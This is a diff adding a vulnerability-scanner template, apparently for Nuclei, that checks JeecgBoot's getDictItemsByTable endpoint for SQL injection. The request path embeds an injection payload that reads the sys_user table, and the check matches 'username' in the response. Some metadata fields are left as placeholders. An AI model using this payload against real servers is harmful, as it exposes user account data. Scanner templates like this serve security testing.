@@ -1,0 +1,19 @@
+id: jeecgboot-getDictItemsByTable-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://xz.aliyun.com/t/13186
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - username
